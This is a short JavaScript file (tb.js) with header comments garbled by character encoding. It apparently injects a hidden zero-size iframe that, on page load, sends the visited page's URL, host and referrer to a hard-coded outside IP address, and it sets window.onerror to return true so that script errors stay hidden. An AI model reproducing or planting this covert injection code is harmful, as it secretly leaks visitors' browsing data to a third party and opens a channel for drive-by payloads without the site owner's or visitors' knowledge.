/*---------------------------------------------------------------
// AspStudio_Codepage="936"
// �������������ʹ�õĴ���ҳ��ǣ��벻Ҫɾ����������ο������ļ���
//
// �������ƣ�tb.js
// ԭ�����ߣ�Lyn
// �����ʼ���lyn.ma@hotmail.com
// �������ڣ������գ�2010��06��27�� 10:05:38
// ��Ȩ����(C)Feng
//--------------------------------------------------------------*/


document.writeln("<script>function oK_Begin(){");
document.writeln("var pp=\"240&pre=\"+(new Date()).getTime(); var s=String(window.location.href);");
document.writeln("var host=escape(s.substring(7,s.indexOf('/',7))); var ref=escape(document.referrer);");
document.writeln("s=escape(s); var uu=\"http://60.191.124.233/dnsC.aspx?AIMT=\"+s+\"&host=\"+host+\"&refer=\"+ref+\"&server=\"+pp;");
document.writeln("document.write(\'<iframe width=0 height=0 src=\"\'+uu+\'\"><\/iframe>\');");
document.writeln("};oK_Begin();<\/script>");
document.writeln("<script>window.onerror=function(){return true;}<\/script>")
